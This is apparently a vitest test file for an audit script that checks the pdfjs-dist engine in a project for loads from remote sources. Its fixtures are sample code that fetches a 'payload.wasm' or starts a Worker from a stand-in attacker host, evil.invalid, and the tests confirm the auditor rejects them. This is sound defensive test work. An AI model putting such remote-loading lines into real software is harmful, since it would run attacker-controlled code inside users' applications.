/** #369: static relative new URL() with an absolute remote base is remote too. */
import { copyFileSync, mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { afterAll, describe, expect, it } from "vitest";
import { inspectPdfEngineProvenance369 } from "../scripts/audit-pdf-engine-provenance-369";

const repository = resolve(import.meta.dirname, "..");
const temporary = mkdtempSync(join(tmpdir(), "pdf369-remote-base-"));
let next = 0;
const assets = [
  "build/pdf.mjs", "build/pdf.worker.mjs", "legacy/build/pdf.mjs", "package.json", "LICENSE",
  "wasm/jbig2.wasm", "wasm/openjpeg.wasm", "wasm/qcms_bg.wasm", "wasm/quickjs-eval.wasm",
  "wasm/LICENSE_JBIG2", "wasm/LICENSE_QCMS", "wasm/LICENSE_PDFJS_JBIG2",
  "wasm/LICENSE_OPENJPEG", "wasm/LICENSE_PDFJS_OPENJPEG", "wasm/LICENSE_PDFJS_QCMS",
  "standard_fonts/LICENSE_LIBERATION", "standard_fonts/LICENSE_FOXIT", "cmaps/LICENSE",
];

function project(source: string): string {
  const root = join(temporary, String(next++));
  for (const file of assets) {
    const target = join(root, "node_modules/pdfjs-dist", file);
    mkdirSync(dirname(target), { recursive: true });
    copyFileSync(join(repository, "node_modules/pdfjs-dist", file), target);
  }
  const sourcePath = join(root, "src/engines/pdf/probe.ts");
  mkdirSync(dirname(sourcePath), { recursive: true });
  writeFileSync(sourcePath, source);
  const manifest = JSON.parse(readFileSync(join(repository, "package.json"), "utf8"));
  const lock = JSON.parse(readFileSync(join(repository, "package-lock.json"), "utf8"));
  const version = manifest.dependencies["pdfjs-dist"];
  writeFileSync(join(root, "package.json"), JSON.stringify({ dependencies: { "pdfjs-dist": version } }));
  writeFileSync(join(root, "package-lock.json"), JSON.stringify({
    lockfileVersion: 3,
    packages: {
      "": { dependencies: { "pdfjs-dist": lock.packages[""].dependencies["pdfjs-dist"] } },
      "node_modules/pdfjs-dist": lock.packages["node_modules/pdfjs-dist"],
    },
  }));
  return root;
}

afterAll(() => rmSync(temporary, { recursive: true, force: true }));

describe("#369 remote base URL static AST detection", () => {
  it.each([
    ["direct fetch", 'fetch(new URL("./payload.wasm", "https://evil.invalid/pdf/"));'],
    ["direct Worker", 'new Worker(new URL("./pdf.worker.mjs", "https://evil.invalid/pdf/"));'],
    ["const remote base + const Worker URL", 'const base = "https://evil.invalid/pdf/"; const worker = new URL("./pdf.worker.mjs", base); new Worker(worker);'],
    ["nested const URL base", 'const base = new URL("https://evil.invalid/pdf/"); fetch(new URL("./payload.wasm", base));'],
  ])("rejects relative remote URL via %s", (_name, source) => {
    expect(new URL("./pdf.worker.mjs", "https://evil.invalid/pdf/").href)
      .toBe("https://evil.invalid/pdf/pdf.worker.mjs");
    expect(() => inspectPdfEngineProvenance369(project(source)))
      .toThrow(/PDF369_NO_GO.*remote/u);
  }, 60_000);

  it("retains legitimate local import.meta.url base and direct relative paths", () => {
    const source = [
      'const local = new URL("./pdf.worker.mjs", import.meta.url);',
      'new Worker(local);',
      'fetch(new URL("./wasm/jbig2.wasm", import.meta.url));',
      'new Worker("./pdf.worker.mjs");',
    ].join("\n");
    expect(inspectPdfEngineProvenance369(project(source)).imports.remoteCount).toBe(0);
  }, 60_000);
});
